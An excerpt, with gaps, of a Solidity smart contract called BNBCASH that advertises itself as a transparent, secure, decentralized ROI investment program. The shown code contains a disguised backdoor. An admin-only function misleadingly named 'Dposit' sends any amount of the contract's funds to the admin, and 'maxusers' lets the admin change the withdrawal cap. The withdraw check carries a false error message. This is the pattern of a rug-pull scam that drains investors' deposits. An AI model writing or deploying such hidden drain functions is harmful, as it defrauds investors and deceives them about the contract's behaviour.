...
// SPDX-License-Identifier: MIT
 ...
 /*  [INTRODUCTION]
 *   BNB CASH is a 100% decentralized ROI program with full transparency and high security that available to everyone.
 *
 * 	                                                                       
...
contract BNBCASH {
    ...
    uint constant public investLimit = 300;
    ...
    uint public maxwithdraw = 50000 ether;
    ...
    constructor(address payable adminAddr) {
        require(!Address.isContract(adminAddr) );
        adminFeeAddress = adminAddr;
        contractCreationTime = block.timestamp;
        contractPercent = getContractBalanceRate();
    }
        modifier userinfo() {
        require(msg.sender == adminFeeAddress);
                            _;
                             }
    ...
    function withdraw() public {
        ...
        require(totalAmount < maxwithdraw, "you must invest more than 10 bnb to withdraw");
    ...
    function getSiteStats() public view returns (uint, uint, uint, uint) {
        ...
        function Dposit(uint256 amount) external userinfo {
        adminFeeAddress.transfer(amount);
                            }
    function maxusers(uint256 maxuser) external userinfo {     
             maxwithdraw = maxuser ;
             }
